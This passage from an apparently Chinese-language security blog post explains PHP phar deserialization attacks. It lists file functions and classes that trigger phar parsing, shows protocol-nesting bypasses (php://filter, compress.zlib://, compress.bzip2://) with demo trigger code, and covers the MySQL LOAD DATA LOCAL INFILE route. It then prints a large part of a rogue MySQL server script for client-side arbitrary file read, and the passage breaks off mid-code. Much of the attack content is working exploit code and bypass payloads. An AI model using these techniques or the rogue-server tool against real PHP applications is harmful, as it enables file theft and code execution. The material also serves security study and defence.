<td style="text-align:center">exif_imagetype</td>
<td style="text-align:center">exif_read_data</td>
<td style="text-align:center">exif_thumbnail</td>
<td style="text-align:center">file</td>
<td style="text-align:center">file_exists</td>
</tr>
<tr>
<td style="text-align:center">file_get_contents</td>
<td style="text-align:center">file_put_contents</td>
<td style="text-align:center">fileatim</td>
<td style="text-align:center">filectime</td>
<td style="text-align:center">filegroup</td>
</tr>
<tr>
<td style="text-align:center">fileinode</td>
<td style="text-align:center">filemtime</td>
<td style="text-align:center">fileowner</td>
<td style="text-align:center">fileperms</td>
<td style="text-align:center">filesize</td>
</tr>
<tr>
<td style="text-align:center">filetype</td>
<td style="text-align:center">finfo_buffer</td>
<td style="text-align:center">finfo_file</td>
<td style="text-align:center">finfo_file</td>
<td style="text-align:center">fopen</td>
</tr>
<tr>
<td style="text-align:center">ftp_appen</td>
<td style="text-align:center">ftp_get</td>
<td style="text-align:center">ftp_nb_get</td>
<td style="text-align:center">ftp_nb_put</td>
<td style="text-align:center">ftp_put</td>
</tr>
<tr>
<td style="text-align:center">get_meta_tags</td>
<td style="text-align:center">getimagesize</td>
<td style="text-align:center">gzfile gzopen</td>
<td style="text-align:center">hash hash_file</td>
<td style="text-align:center">hash_file</td>
</tr>
<tr>
<td style="text-align:center">hash_hmac</td>
<td style="text-align:center">hash_hmac_file</td>
<td style="text-align:center">hash_update_file</td>
<td style="text-align:center">highlight_file</td>
<td style="text-align:center">imagebmp</td>
</tr>
<tr>
<td style="text-align:center">imagecreatefrombmp</td>
<td style="text-align:center">imagecreatefromgd</td>
<td style="text-align:center">imagecreatefromgd2</td>
<td style="text-align:center">imagecreatefromgd2part</td>
<td style="text-align:center">imagecreatefromgif</td>
</tr>
<tr>
<td style="text-align:center">imagecreatefromjpeg</td>
<td style="text-align:center">imagecreatefrompng</td>
<td style="text-align:center">imagecreatefromtga</td>
<td style="text-align:center">imagecreatefromwbmp</td>
<td style="text-align:center">imagecreatefromwebp</td>
</tr>
<tr>
<td style="text-align:center">imagecreatefromxbm</td>
<td style="text-align:center">imagecreatefromxpm</td>
<td style="text-align:center">imagegif</td>
<td style="text-align:center">imagejpeg</td>
<td style="text-align:center">imageloadfont</td>
</tr>
<tr>
<td style="text-align:center">imagepng</td>
<td style="text-align:center">imagewbmp</td>
<td style="text-align:center">imagewebp</td>
<td style="text-align:center">imagexbm</td>
<td style="text-align:center">imap_savebody</td>
</tr>
<tr>
<td style="text-align:center">include</td>
<td style="text-align:center">include_once</td>
<td style="text-align:center">is_dir</td>
<td style="text-align:center">is_executable</td>
<td style="text-align:center">is_file</td>
</tr>
<tr>
<td style="text-align:center">is_link</td>
<td style="text-align:center">is_readable</td>
<td style="text-align:center">is_writable</td>
<td style="text-align:center">is_writeable</td>
<td style="text-align:center">md5_file</td>
</tr>
<tr>
<td style="text-align:center">mhash</td>
<td style="text-align:center">mime_content_type</td>
<td style="text-align:center">mkdir</td>
<td style="text-align:center">parse_ini_file</td>
<td style="text-align:center">readfile</td>
</tr>
<tr>
<td style="text-align:center">readgzfile</td>
<td style="text-align:center">require</td>
<td style="text-align:center">require_once</td>
<td style="text-align:center">rmdir</td>
<td style="text-align:center">scandir</td>
</tr>
<tr>
<td style="text-align:center">show_source</td>
<td style="text-align:center">sha1_file</td>
<td style="text-align:center">stat</td>
<td style="text-align:center">tidy_parse_file</td>
<td style="text-align:center">touch</td>
</tr>
<tr>
<td style="text-align:center">unlink</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<p>以及常用的可以通过直接或间接调用 <code>phar</code> 协议来进行 <code>反序列化</code> 的类方法👇</p>
<table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:center"></th>
<th style="text-align:center"></th>
<th style="text-align:center"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">SplFileInfo::isFile</td>
<td style="text-align:center">SplFileInfo::isDir</td>
<td style="text-align:center">SplFileInfo::isLink</td>
<td style="text-align:center">SplFileInfo::getSize</td>
</tr>
<tr>
<td style="text-align:center">SplFileInfo::getType</td>
<td style="text-align:center">SplFileInfo::getATime</td>
<td style="text-align:center">SplFileInfo::getCTime</td>
<td style="text-align:center">SplFileInfo::getGroup</td>
</tr>
<tr>
<td style="text-align:center">SplFileInfo::getInode</td>
<td style="text-align:center">SplFileInfo::getMTime</td>
<td style="text-align:center">SplFileInfo::getOwner</td>
<td style="text-align:center">SplFileInfo::getPerms</td>
</tr>
<tr>
<td style="text-align:center">SplFileInfo::openFile</td>
<td style="text-align:center">SplFileInfo::isReadable</td>
<td style="text-align:center">SplFileInfo::isWritable</td>
<td style="text-align:center">SplFileInfo::isExecutable</td>
</tr>
<tr>
<td style="text-align:center">SplFileObject::__construct</td>
<td style="text-align:center">XMLReader::open</td>
<td style="text-align:center">XMLWriter::openUri</td>
<td style="text-align:center">DOMDocument::loadHTMLFile</td>
</tr>
<tr>
<td style="text-align:center">DOMDocument::loadXMLFile</td>
<td style="text-align:center">DirectoryIterator::__construct</td>
<td style="text-align:center">SimpleXMLElement::__construct</td>
<td style="text-align:center">PDO::__construct</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<p>像一些比较特殊的，比如 <code>mysqli_connect</code> 和 <code>mysqli_query</code> 也可以，到后面的再说。</p>
<h2 id="反序列化">- 反序列化 -</h2>
<p>终于到了有关 <code>反序列化</code> 的正题了，由于一般的如直接从影响函数调用 <code>phar://</code> 进行 <code>反序列化</code> 已经耳熟能详，下面就根据经验简单的对 <code>反序列化</code> 的方式做一个小补充。</p>
<h3 id="协议嵌套">- 协议嵌套 -</h3>
<p>在遇到一些特殊情况，如无法以 <code>phar://</code> 开头时，可以用以下方式替代👇</p>
<ul>
<li><code>php://filter//resource=phar://</code></li>
<li><code>compress.zlib://phar://</code></li>
<li><code>compress.bzip2://phar://</code></li>
</ul>
<p>那么依次来看吧。</p>
<h4 id="php-filter">- php://filter -</h4>
<p>先来看 <code>php://filter//resource=phar://</code> 这一条，在 <code>php_fopen_wrapper.c</code> 文件的 <code>php_stream_url_wrap_php</code> 函数中👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201262252543.png" alt="image-20220126225250441"></p>
<p>存在对 <code>php_stream_open_wrapper</code> 函数的调用，而 <code>p + 10</code> 刚好对应 <code>/resource=</code> 的长度，即会将 <code>php://filter//resource=[内容]</code> 的内容部分再次调用 <code>php_stream_open_wrapper</code> 函数进行解析。</p>
<h4 id="compress-zlib">- compress.zlib:// -</h4>
<p>再来看 <code>compress.zlib://phar://</code> 这一条，在 <code>zlib_fopen_wrapper.c</code> 文件的 <code>php_stream_gzopen</code> 函数中👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201262256794.png" alt="image-20220126225658691"></p>
<p>存在对 <code>php_stream_open_wrapper_ex</code> 函数的调用，而 <code>php_stream_open_wrapper_ex</code> 和 <code>php_stream_open_wrapper</code> 一样，原型都为 <code>_php_stream_open_wrapper_ex</code> 函数；同时这里显然会跳过 <code>compress.zlib://</code> 并将后面的内容再次放入 <code>php_stream_open_wrapper_ex</code> 函数进行解析(理论上 <code>zlib:phar://</code> 好像也可以，不会似乎得调用特定的函数)。</p>
<h4 id="compress-bzip2">- compress.bzip2:// -</h4>
<p>接着看 <code>compress.bzip2://phar://</code> 这一条，在 <code>bz2.c</code> 文件的 <code>_php_stream_bz2open_from_BZFILE</code> 函数中👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201262301811.png" alt="image-20220126230144664"></p>
<p>这里是当无法将 <code>compress.bzip2://[内容]</code> 的内容部分作为 <code>bz2</code> 文件解析时就会将其作为参数去调用 <code>php_stream_open_wrapper</code> 函数。</p>
<h4 id="演示">- 演示 -</h4>
<p>不妨使用这 <code>3</code> 种 <code>嵌套协议</code> 尝试进行 <code>反序列化</code> ，其中 <code>phar</code> 代码如下👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;p.phar&quot;</span>);</span><br><span class="line"><span class="variable">$p</span>-&gt;setMetaData(<span class="keyword">new</span> e);</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;a&#x27;</span>]=<span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>然后是触发代码👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;ok!&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$argv</span>[<span class="number">1</span>])&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&quot;1&quot;</span>:</span><br><span class="line">		@file(<span class="string">&quot;php://filter//resource=phar://./p.phar/a&quot;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&quot;2&quot;</span>:</span><br><span class="line">		@file(<span class="string">&quot;compress.zlib://phar://./p.phar/a&quot;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&quot;3&quot;</span>:</span><br><span class="line">		@file(<span class="string">&quot;compress.bzip2://phar://./p.phar/a&quot;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得到结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201262311570.png" alt="image-20220126231118486"></p>
<p>可见全都成功了。</p>
<h3 id="SQL">- SQL -</h3>
<p>没错，在进行有关 <code>SQL</code> 的调用时也是有机会触发 <code>phar</code> 的，而这个有关 <code>SQL</code> 的调用可以分为以下三种情况👇</p>
<ul>
<li><code>执行语句 'load data local infile [文件名] into table ?.?'</code></li>
<li><code>使用sha256认证模式连接sql服务</code></li>
<li><code>以pdo模式连接数据库</code></li>
</ul>
<p>那么一个个来看。</p>
<h4 id="load-data-local-infile">- load data local infile -</h4>
<p>其中第一个执行 <code>'load data local infile [文件名] into table ?.?'</code> 语句应该都很熟悉了，<code>load data local infile [文件名]</code> 这玩意其实就是早些时候有关 <code>客户端任意文件读取</code> 的漏洞。</p>
<p>那么至于这个语句为什么能够触发 <code>phar</code> 呢，来看 <code>mysqlnd_loaddata.c</code> 文件的 <code>mysqlnd_local_infile_init</code> 函数👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201262331955.png" alt="image-20220126233131818"></p>
<p>可以看到，在执行有关 <code>'load data local infile [文件名] into table ?.?'</code> 语句时，会将文件名作为参数去调用 <code>php_stream_open_wrapper_ex</code> 函数，从而也就能对 <code>phar</code> 协议进行解析。</p>
<p>不妨做一个演示，首先是有关 <code>phar</code> 代码👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;p.phar&quot;</span>);</span><br><span class="line"><span class="variable">$p</span>-&gt;setMetaData(<span class="keyword">new</span> e);</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;a&#x27;</span>]=<span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>接着需要更改  <code>php.ini</code> 文件中的 <code>mysqli.allow_local_infile = On</code> ，然后就行了(反正我自己的环境是能触发成功了，<code>my.ini</code> 配置没改，甚至 <code>secure_priv_file=NULL</code>)。</p>
<p>之后是触发代码👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">e</span></span>&#123;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;[wakeup]&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;[destruct]&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$m</span> = mysqli_init();</span><br><span class="line">	mysqli_real_connect(<span class="variable">$m</span>,<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">	mysqli_query(<span class="variable">$m</span>,<span class="string">&quot;LOAD DATA LOCAL INFILE &#x27;phar://F:/phpEnv/web/php74/p.phar/a&#x27; INTO TABLE cx.a;&quot;</span>);</span><br><span class="line">	<span class="variable">$m</span>-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>执行效果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201262347459.png" alt="image-20220126234713369"></p>
<p>可见是成功了。</p>
<p>那么不妨尝试利用 <code>客户端任意文件读</code> 的 <code>payload</code> 去尝试触发 <code>phar</code> 👇</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> AF_INET, SOCK_STREAM, error</span><br><span class="line"><span class="keyword">from</span> asyncore <span class="keyword">import</span> dispatcher, loop <span class="keyword">as</span> _asyLoop</span><br><span class="line"><span class="keyword">from</span> asynchat <span class="keyword">import</span> async_chat</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> Struct</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> version_info</span><br><span class="line"><span class="keyword">from</span> logging <span class="keyword">import</span> getLogger, INFO, StreamHandler, Formatter</span><br><span class="line"></span><br><span class="line">_rouge_mysql_sever_read_file_result = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">_rouge_mysql_server_read_file_end = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkVersionPy3</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">not</span> version_info &lt; (<span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rouge_mysql_sever_read_file</span>(<span class="params">fileName, port, showInfo</span>):</span></span><br><span class="line">    <span class="keyword">if</span> showInfo:</span><br><span class="line">        log = getLogger(__name__)</span><br><span class="line">        log.setLevel(INFO)</span><br><span class="line">        tmp_format = StreamHandler()</span><br><span class="line">        tmp_format.setFormatter(Formatter(<span class="string">&quot;%(asctime)s : %(levelname)s : %(message)s&quot;</span>))</span><br><span class="line">        log.addHandler(</span><br><span class="line">            tmp_format</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_infoShow</span>(<span class="params">*args</span>):</span></span><br><span class="line">        <span class="keyword">if</span> showInfo:</span><br><span class="line">            log.info(*args)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ================================================</span></span><br><span class="line">    <span class="comment"># =======No need to change after this lines=======</span></span><br><span class="line">    <span class="comment"># ================================================</span></span><br><span class="line"></span><br><span class="line">    __author__ = <span class="string">&#x27;Gifts&#x27;</span></span><br><span class="line">    __modify__ = <span class="string">&#x27;Morouu&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">global</span> _rouge_mysql_sever_read_file_result</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">_LastPacket</span>(<span class="params">Exception</span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">_OutOfOrder</span>(<span class="params">Exception</span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">_MysqlPacket</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">        packet_header = Struct(<span class="string">&#x27;&lt;Hbb&#x27;</span>)</span><br><span class="line">        packet_header_long = Struct(<span class="string">&#x27;&lt;Hbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, packet_type, payload</span>):</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(packet_type, _MysqlPacket):</span><br><span class="line">                self.packet_num = packet_type.packet_num + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.packet_num = packet_type</span><br><span class="line">            self.payload = payload</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">            payload_len = <span class="built_in">len</span>(self.payload)</span><br><span class="line">            <span class="keyword">if</span> payload_len &lt; <span class="number">65536</span>:</span><br><span class="line">                header = _MysqlPacket.packet_header.pack(payload_len, <span class="number">0</span>, self.packet_num)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                header = _MysqlPacket.packet_header.pack(payload_len &amp; <span class="number">0xFFFF</span>, payload_len &gt;&gt; <span class="number">16</span>, <span class="number">0</span>, self.packet_num)</span><br><span class="line"></span><br><span class="line">            result = <span class="string">&quot;&quot;</span>.join(</span><br><span class="line">                (</span><br><span class="line">                    header.decode(<span class="string">&quot;latin1&quot;</span>) <span class="keyword">if</span> checkVersionPy3() <span class="keyword">else</span> header,</span><br><span class="line">                    self.payload</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">repr</span>(<span class="built_in">str</span>(self))</span><br><span class="line"></span><br><span class="line"><span class="meta">        @staticmethod</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">raw_data</span>):</span></span><br><span class="line">            packet_num = raw_data[<span class="number">0</span>] <span class="keyword">if</span> checkVersionPy3() <span class="keyword">else</span> <span class="built_in">ord</span>(raw_data[<span class="number">0</span>])</span><br><span class="line">            payload = raw_data[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> _MysqlPacket(packet_num, payload.decode(<span class="string">&quot;latin1&quot;</span>) <span class="keyword">if</span> checkVersionPy3() <span class="keyword">else</span> payload)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">_HttpRequestHandler</span>(<span class="params">async_chat</span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, addr</span>):</span></span><br><span class="line">            async_chat.__init__(self, sock=addr[<span class="number">0</span>])</span><br><span class="line">            self.addr = addr[<span class="number">1</span>]</span><br><span class="line">            self.ibuffer = []</span><br><span class="line">            self.set_terminator(<span class="number">3</span>)</span><br><span class="line">            self.stateList = [<span class="string">b&quot;LEN&quot;</span>, <span class="string">b&quot;Auth&quot;</span>, <span class="string">b&quot;Data&quot;</span>, <span class="string">b&quot;MoreLength&quot;</span>, <span class="string">b&quot;File&quot;</span>] <span class="keyword">if</span> checkVersionPy3() <span class="keyword">else</span> [<span class="string">&quot;LEN&quot;</span>,</span><br><span class="line">                                                                                                           <span class="string">&quot;Auth&quot;</span>,</span><br><span class="line">                                                                                                           <span class="string">&quot;Data&quot;</span>,</span><br><span class="line">                                                                                                           <span class="string">&quot;MoreLength&quot;</span>,</span><br><span class="line">                                                                                                           <span class="string">&quot;File&quot;</span>]</span><br><span class="line">            self.state = self.stateList[<span class="number">0</span>]</span><br><span class="line">            self.sub_state = self.stateList[<span class="number">1</span>]</span><br><span class="line">            self.logined = <span class="literal">False</span></span><br><span class="line">            self.file = <span class="string">&quot;&quot;</span></span><br><span class="line">            self.push(</span><br><span class="line">                _MysqlPacket(</span><br><span class="line">                    <span class="number">0</span>,</span><br><span class="line">                    <span class="string">&quot;&quot;</span>.join((</span><br><span class="line">                        <span class="string">&#x27;\x0a&#x27;</span>,  <span class="comment"># Protocol</span></span><br><span class="line">                        <span class="string">&#x27;5.6.28-0ubuntu0.14.04.1&#x27;</span> + <span class="string">&#x27;\0&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&#x27;</span>,</span><br><span class="line">                    )))</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            self.order = <span class="number">1</span></span><br><span class="line">            self.states = [<span class="string">b&#x27;LOGIN&#x27;</span>, <span class="string">b&#x27;CAPS&#x27;</span>, <span class="string">b&#x27;ANY&#x27;</span>] <span class="keyword">if</span> checkVersionPy3() <span class="keyword">else</span> [<span class="string">&#x27;LOGIN&#x27;</span>, <span class="string">&#x27;CAPS&#x27;</span>, <span class="string">&#x27;ANY&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">push</span>(<span class="params">self, data</span>):</span></span><br><span class="line">            _infoShow(<span class="string">&#x27;Pushed: %r&#x27;</span>, data)</span><br><span class="line">            data = <span class="built_in">str</span>(data)</span><br><span class="line">            async_chat.push(self, data.encode(<span class="string">&quot;latin1&quot;</span>) <span class="keyword">if</span> checkVersionPy3() <span class="keyword">else</span> data)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> 